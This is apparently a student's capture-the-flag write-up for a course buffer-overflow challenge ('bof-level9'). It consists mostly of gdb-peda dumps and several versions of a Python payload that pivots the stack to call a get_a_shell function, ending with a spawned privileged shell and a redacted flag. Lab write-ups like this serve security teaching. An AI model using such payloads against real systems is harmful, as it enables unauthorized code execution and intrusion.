@@ -1,0 +1,442 @@
+--------------------
+bof-level9_
+--------------------
+1.
+find the get a shell
+#0x08 04 85 2b  get_a_shell
+2.
+find the bufffer end
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd540 --> 0x1 
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0x0 
+ESP: 0xffffd53c --> 0xf7e1a637 (<__libc_start_main+247>:	add    $0x10,%esp)
+EIP: 0x80485e2 (<main+106>:	ret)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485db <main+99>:	mov    -0x4(%ebp),%ecx
+   0x80485de <main+102>:	leave  
+   0x80485df <main+103>:	lea    -0x4(%ecx),%esp
+=> 0x80485e2 <main+106>:	ret    
+   0x80485e3:	xchg   %ax,%ax
+   0x80485e5:	xchg   %ax,%ax
+   0x80485e7:	xchg   %ax,%ax
+   0x80485e9:	xchg   %ax,%ax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd53c --> 0xf7e1a637 (<__libc_start_main+247>:	add    $0x10,%esp 
+
+*************************************************************************************
+here is the return, so the buffer end at here
+*************************************************************************************)
+0004| 0xffffd540 --> 0x1 
+0008| 0xffffd544 --> 0xffffd5d4 --> 0xffffd711 ("/home/users/nintyfour/week2/bof-level9/bof-level9")
+0012| 0xffffd548 --> 0xffffd5dc --> 0xffffd743 ("XDG_SESSION_ID=2163")
+0016| 0xffffd54c --> 0x0 
+0020| 0xffffd550 --> 0x0 
+0024| 0xffffd554 --> 0x0 
+0028| 0xffffd558 --> 0xf7fb4000 --> 0x1b1db0 
+[------------------------------------------------------------------------------]
+
+
+3.
+but when I look at the $esp, I find in 0xffffd52c also have return. SO it means in 0xffffd52c need to fill the buffer start!
+gdb-peda$ x/100xw $esp-0x100
+0xffffd43c:	0xf7e601ed	0xf7fb45a0	0xffffd4a8	0x000000bf
+0xffffd44c:	0x0000000a	0x00000001	0xf7e091a8	0x0000001d
+0xffffd45c:	0x00000000	0xf7fe77eb	0x00000000	0xf7e01700
+0xffffd46c:	0x00000000	0xffffd528	0xf7fee010	0xf7e6015b
+0xffffd47c:	0x00000000	0xf7fb4000	0xf7fb4000	0xffffd528
+0xffffd48c:	0x080485d3	0xffffd4a8	0x000000c0	0xf7fb45a0
+0xffffd49c:	0x00f0b5ff	0xffffd4de	0x00000001	0x34333231<-here
+0xffffd4ac:	0xf7e9000a	0xffffd4de	0xffffd5dc	0x000000e0
+0xffffd4bc:	0x00000000	0xf7ffd000	0xf7ffd918	0xffffd4e0
+0xffffd4cc:	0x080482c9	0x00000000	0xffffd574	0xf7fb4000
+0xffffd4dc:	0x00008f17	0xffffffff	0x0000002f	0xf7e0edc8
+0xffffd4ec:	0xf7fd31b0	0x00008000	0xf7fb4000	0xf7fb2244
+0xffffd4fc:	0xf7e1a0ec	0x00000001	0x00000000	0xf7e30a50
+0xffffd50c:	0x0804863b	0x00000001	0xffffd5d4	0xffffd5dc
+0xffffd51c:	0x08048611	0xf7fb43dc	0xffffd540	0x00000000
+0xffffd52c:	0xf7e1a637<-here0xf7fb4000	0xf7fb4000	0x00000000
+0xffffd53c:	0xf7e1a637<-here0x00000001	0xffffd5d4	0xffffd5dc
+0xffffd54c:	0x00000000	0x00000000	0x00000000	0xf7fb4000
+0xffffd55c:	0xf7ffdc04	0xf7ffd000	0x00000000	0xf7fb4000
+0xffffd56c:	0xf7fb4000	0x00000000	0x62c5ce75	0x5e24a065
+0xffffd57c:	0x00000000	0x00000000	0x00000000	0x00000001
+0xffffd58c:	0x08048430	0x00000000	0xf7fee010	0xf7fe8880
+0xffffd59c:	0xf7ffd000	0x00000001	0x08048430	0x00000000
+0xffffd5ac:	0x08048451	0x08048578	0x00000001	0xffffd5d4
+0xffffd5bc:	0x080485f0	0x08048650	0xf7fe8880	0xffffd5cc
+because of this the buffer only need 30 *4 bytes.
+BTW, I check where is the buffer start. 
+0xffffd4a8
+
+
+4. So I write the python code is 
+#!/usr/bin/env python
+with open('input.txt','wb') as f:
+        f.write("xxxx"+"\x2b\x85\x04\x08" + "aaaa" * (36-6)+"\xa8\xd4\xff\xff")
+
+5.then it cannot run so I check the instruction
+
+   0x080485d3 <+91>:	add    $0x10,%esp
+   0x080485d6 <+94>:	mov    $0x0,%eax
+   0x080485db <+99>:	mov    -0x4(%ebp),%ecx
+   0x080485de <+102>:	leave  
+   0x080485df <+103>:	lea    -0x4(%ecx),%esp
+   0x080485e2 <+106>:	ret    
+
+here ebp-0x4, so I need to delte the "xxxx" for save_ebp
+So I write the python code is
+#!/usr/bin/env python
+with open('input.txt','wb') as f:
+        f.write("\x2b\x85\x04\x08" + "aaaa" * (36-6)+"\xa8\xd4\xff\xff")
+
+6. in here   
+	
+   0x080485db <+99>:    mov    -0x4(%ebp),%ecx
+   0x080485de <+102>:   leave
+   0x080485df <+103>:   lea    -0x4(%ecx),%esp
+
+which means  -0x4(%ebp)=%ecx  -0x4(%ecx)=%esp
+I have          |                         |  		
+               ????               "\xa8\xd4\xff\xff"			
+so in here ebp=  "\xa8\xd4\xff\xff" +4 =  "\xac\xd4\xff\xff"
+
+ So I write the python code is
+#!/usr/bin/env python
+with open('input.txt','wb') as f:
+        f.write("\x2b\x85\x04\x08" + "aaaa" * (36-6)+"\xac\xd4\xff\xff")
+7.
+run it
+
+
+nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level9
+$ python level9.py 
+
+nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level9
+$ gdb ./bof-level9 
+Reading symbols from ./bof-level9...(no debugging symbols found)...done.
+gdb-peda$ b *main +91
+Breakpoint 1 at 0x80485d3
+gdb-peda$ r < input.txt 
+Starting program: /home/users/nintyfour/week2/bof-level9/bof-level9 < input.txt
+Now we have a buffer overflow vulnerability,
+hbut the vulnerability cannot reach to the return address...
+Can you exploit this program?
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0xffffd528 --> 0x0 
+ESP: 0xffffd490 --> 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+EIP: 0x80485d3 (<main+91>:	add    $0x10,%esp)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485ca <main+82>:	lea    -0x80(%ebp),%eax
+   0x80485cd <main+85>:	push   %eax
+   0x80485ce <main+86>:	call   0x80483c0 <fgets@plt>
+=> 0x80485d3 <main+91>:	add    $0x10,%esp
+   0x80485d6 <main+94>:	mov    $0x0,%eax
+   0x80485db <main+99>:	mov    -0x4(%ebp),%ecx
+   0x80485de <main+102>:	leave  
+   0x80485df <main+103>:	lea    -0x4(%ecx),%esp
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd490 --> 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+0004| 0xffffd494 --> 0xc0 
+0008| 0xffffd498 --> 0xf7fb45a0 --> 0xfbad2098 
+0012| 0xffffd49c --> 0xf0b5ff 
+0016| 0xffffd4a0 --> 0xffffd4de ('a' <repeats 70 times>, "\254\324\377\377")
+0020| 0xffffd4a4 --> 0x1 
+0024| 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+0028| 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080485d3 in main ()
+gdb-peda$ ni
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0xffffd528 --> 0x0 
+ESP: 0xffffd4a0 --> 0xffffd4de ('a' <repeats 70 times>, "\254\324\377\377")
+EIP: 0x80485d6 (<main+94>:	mov    $0x0,%eax)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485cd <main+85>:	push   %eax
+   0x80485ce <main+86>:	call   0x80483c0 <fgets@plt>
+   0x80485d3 <main+91>:	add    $0x10,%esp
+=> 0x80485d6 <main+94>:	mov    $0x0,%eax
+   0x80485db <main+99>:	mov    -0x4(%ebp),%ecx
+   0x80485de <main+102>:	leave  
+   0x80485df <main+103>:	lea    -0x4(%ecx),%esp
+   0x80485e2 <main+106>:	ret
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd4a0 --> 0xffffd4de ('a' <repeats 70 times>, "\254\324\377\377")
+0004| 0xffffd4a4 --> 0x1 
+0008| 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+0012| 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+0016| 0xffffd4b0 ('a' <repeats 116 times>, "\254\324\377\377")
+0020| 0xffffd4b4 ('a' <repeats 112 times>, "\254\324\377\377")
+0024| 0xffffd4b8 ('a' <repeats 108 times>, "\254\324\377\377")
+0028| 0xffffd4bc ('a' <repeats 104 times>, "\254\324\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485d6 in main ()
+gdb-peda$ ni
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0xffffd528 --> 0x0 
+ESP: 0xffffd4a0 --> 0xffffd4de ('a' <repeats 70 times>, "\254\324\377\377")
+EIP: 0x80485db (<main+99>:	mov    -0x4(%ebp),%ecx)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485ce <main+86>:	call   0x80483c0 <fgets@plt>
+   0x80485d3 <main+91>:	add    $0x10,%esp
+   0x80485d6 <main+94>:	mov    $0x0,%eax
+=> 0x80485db <main+99>:	mov    -0x4(%ebp),%ecx
+   0x80485de <main+102>:	leave  
+   0x80485df <main+103>:	lea    -0x4(%ecx),%esp
+   0x80485e2 <main+106>:	ret    
+   0x80485e3:	xchg   %ax,%ax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd4a0 --> 0xffffd4de ('a' <repeats 70 times>, "\254\324\377\377")
+0004| 0xffffd4a4 --> 0x1 
+0008| 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+0012| 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+0016| 0xffffd4b0 ('a' <repeats 116 times>, "\254\324\377\377")
+0020| 0xffffd4b4 ('a' <repeats 112 times>, "\254\324\377\377")
+0024| 0xffffd4b8 ('a' <repeats 108 times>, "\254\324\377\377")
+0028| 0xffffd4bc ('a' <repeats 104 times>, "\254\324\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485db in main ()
+gdb-peda$ ni
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0xffffd528 --> 0x0 
+ESP: 0xffffd4a0 --> 0xffffd4de ('a' <repeats 70 times>, "\254\324\377\377")
+EIP: 0x80485de (<main+102>:	leave)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485d3 <main+91>:	add    $0x10,%esp
+   0x80485d6 <main+94>:	mov    $0x0,%eax
+   0x80485db <main+99>:	mov    -0x4(%ebp),%ecx
+=> 0x80485de <main+102>:	leave  
+   0x80485df <main+103>:	lea    -0x4(%ecx),%esp
+   0x80485e2 <main+106>:	ret    
+   0x80485e3:	xchg   %ax,%ax
+   0x80485e5:	xchg   %ax,%ax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd4a0 --> 0xffffd4de ('a' <repeats 70 times>, "\254\324\377\377")
+0004| 0xffffd4a4 --> 0x1 
+0008| 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+0012| 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+0016| 0xffffd4b0 ('a' <repeats 116 times>, "\254\324\377\377")
+0020| 0xffffd4b4 ('a' <repeats 112 times>, "\254\324\377\377")
+0024| 0xffffd4b8 ('a' <repeats 108 times>, "\254\324\377\377")
+0028| 0xffffd4bc ('a' <repeats 104 times>, "\254\324\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485de in main ()
+gdb-peda$ ni
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0x0 
+ESP: 0xffffd52c --> 0xf7e1a637 (<__libc_start_main+247>:	add    $0x10,%esp)
+EIP: 0x80485df (<main+103>:	lea    -0x4(%ecx),%esp)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485d6 <main+94>:	mov    $0x0,%eax
+   0x80485db <main+99>:	mov    -0x4(%ebp),%ecx
+   0x80485de <main+102>:	leave  
+=> 0x80485df <main+103>:	lea    -0x4(%ecx),%esp
+   0x80485e2 <main+106>:	ret    
+   0x80485e3:	xchg   %ax,%ax
+   0x80485e5:	xchg   %ax,%ax
+   0x80485e7:	xchg   %ax,%ax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd52c --> 0xf7e1a637 (<__libc_start_main+247>:	add    $0x10,%esp)
+0004| 0xffffd530 --> 0xf7fb4000 --> 0x1b1db0 
+0008| 0xffffd534 --> 0xf7fb4000 --> 0x1b1db0 
+0012| 0xffffd538 --> 0x0 
+0016| 0xffffd53c --> 0xf7e1a637 (<__libc_start_main+247>:	add    $0x10,%esp)
+0020| 0xffffd540 --> 0x1 
+0024| 0xffffd544 --> 0xffffd5d4 --> 0xffffd712 ("/home/users/nintyfour/week2/bof-level9/bof-level9")
+0028| 0xffffd548 --> 0xffffd5dc --> 0xffffd744 ("XDG_SESSION_ID=2166")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485df in main ()
+gdb-peda$ ni
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0x0 
+ESP: 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+EIP: 0x80485e2 (<main+106>:	ret)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485db <main+99>:	mov    -0x4(%ebp),%ecx
+   0x80485de <main+102>:	leave  
+   0x80485df <main+103>:	lea    -0x4(%ecx),%esp
+=> 0x80485e2 <main+106>:	ret    
+   0x80485e3:	xchg   %ax,%ax
+   0x80485e5:	xchg   %ax,%ax
+   0x80485e7:	xchg   %ax,%ax
+   0x80485e9:	xchg   %ax,%ax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd4a8 --> 0x804852b (<get_a_shell>:	push   %ebp)
+0004| 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+0008| 0xffffd4b0 ('a' <repeats 116 times>, "\254\324\377\377")
+0012| 0xffffd4b4 ('a' <repeats 112 times>, "\254\324\377\377")
+0016| 0xffffd4b8 ('a' <repeats 108 times>, "\254\324\377\377")
+0020| 0xffffd4bc ('a' <repeats 104 times>, "\254\324\377\377")
+0024| 0xffffd4c0 ('a' <repeats 100 times>, "\254\324\377\377")
+0028| 0xffffd4c4 ('a' <repeats 96 times>, "\254\324\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485e2 in main ()
+gdb-peda$ ni
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+EDX: 0xf7fb587c --> 0x0 
+ESI: 0xf7fb4000 --> 0x1b1db0 
+EDI: 0xf7fb4000 --> 0x1b1db0 
+EBP: 0x0 
+ESP: 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+EIP: 0x804852b (<get_a_shell>:	push   %ebp)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048522 <frame_dummy+34>:	add    $0x10,%esp
+   0x8048525 <frame_dummy+37>:	leave  
+   0x8048526 <frame_dummy+38>:	jmp    0x80484a0 <register_tm_clones>
+=> 0x804852b <get_a_shell>:	push   %ebp
+   0x804852c <get_a_shell+1>:	mov    %esp,%ebp
+   0x804852e <get_a_shell+3>:	push   %ebx
+   0x804852f <get_a_shell+4>:	sub    $0x4,%esp
+   0x8048532 <get_a_shell+7>:	sub    $0xc,%esp
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd4ac ('a' <repeats 120 times>, "\254\324\377\377")
+0004| 0xffffd4b0 ('a' <repeats 116 times>, "\254\324\377\377")
+0008| 0xffffd4b4 ('a' <repeats 112 times>, "\254\324\377\377")
+0012| 0xffffd4b8 ('a' <repeats 108 times>, "\254\324\377\377")
+0016| 0xffffd4bc ('a' <repeats 104 times>, "\254\324\377\377")
+0020| 0xffffd4c0 ('a' <repeats 100 times>, "\254\324\377\377")
+0024| 0xffffd4c4 ('a' <repeats 96 times>, "\254\324\377\377")
+0028| 0xffffd4c8 ('a' <repeats 92 times>, "\254\324\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804852b in get_a_shell ()
+
+
+8. 
+nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level9
+$ (cat input.txt; cat) | ./bof-level9
+Now we have a buffer overflow vulnerability,
+hbut the vulnerability cannot reach to the return address...
+Can you exploit this program?
+
+
+Segmentation fault (core dumped)
+
+nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level9
+$ gdb --core=core
+[New LWP 11648]
+
+warning: Unexpected size of section `.reg-xstate/11648' in core file.
+Core was generated by `./bof-level9'.
+Program terminated with signal SIGSEGV, Segmentation fault.
+
+warning: Unexpected size of section `.reg-xstate/11648' in core file.
+#0  0x61616161 in ?? ()
+gdb-peda$ x/100xw $esp-0x100
+0xffffd3ac:	0x00000001	0x0000001e	0x0000000a	0xf7e611f9
+0xffffd3bc:	0xf7fb4000	0xf7fb45a0	0x00000000	0xffffd448
+0xffffd3cc:	0xf7e613ce	0xf7fb45a0	0xffffd468	0x000000bf
+0xffffd3dc:	0x0000000a	0x00000001	0x00000000	0x00000000
+0xffffd3ec:	0xf7e6ce12	0xf7fb4d60	0x0000000a	0xf7ff39f3
+0xffffd3fc:	0xf7e601ed	0xf7fb45a0	0xffffd468	0x000000bf
+0xffffd40c:	0x0000000a	0x00000001	0xf7e091a8	0x0000001d
+0xffffd41c:	0x00000000	0xf7fe77eb	0x00000000	0xf7e01700
+0xffffd42c:	0x00000000	0xffffd4e8	0xf7fee010	0xf7e6015b
+0xffffd43c:	0x00000000	0xf7fb4000	0xf7fb4000	0xffffd4e8
+0xffffd44c:	0x080485d3	0xffffd468	0x000000c0	0xf7fb45a0
+0xffffd45c:	0x00f0b5ff	0xffffd49e	0x00000001	0x0804852b<-here
+0xffffd46c:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd47c:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd48c:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd49c:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd4ac:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd4bc:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd4cc:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd4dc:	0x61616161	0x61616161	0xffffd4ac	0x0000000a
+0xffffd4ec:	0xf7e1a637	0xf7fb4000	0xf7fb4000	0x00000000
+0xffffd4fc:	0xf7e1a637	0x00000001	0xffffd594	0xffffd59c
+0xffffd50c:	0x00000000	0x00000000	0x00000000	0xf7fb4000
+0xffffd51c:	0xf7ffdc04	0xf7ffd000	0x00000000	0xf7fb4000
+0xffffd52c:	0xf7fb4000	0x00000000	0x83640993	0xbf85e783
+
+in here i find the buffer 
+
+as the same reason of STEP 6which means  -0x4(%ebp)=%ecx  -0x4(%ecx)=%esp
+I have          |                         |
+               ????               "\x68\xd4\xff\xff"
+so in here ebp=  "\x68\xd4\xff\xff" +4 =  "\x6c\xd4\xff\xff"
+
+9.
+So python code will be
+#!/usr/bin/env python
+with open('input.txt','wb') as f:
+        f.write("\x2b\x85\x04\x08" + "aaaa" * (36-6)+"\x6c\xd4\xff\xff")
+
+10.
+nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level9
+$ python level9.py 
+
+nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level9
+$ (cat input.txt; cat) | ./bof-level9
+Now we have a buffer overflow vulnerability,
+hbut the vulnerability cannot reach to the return address...
+Can you exploit this program?
+
+Spawning a privileged shell
+cat flag
+cs519{XXXXXXXXXXXXXXXXXXXXXXX}
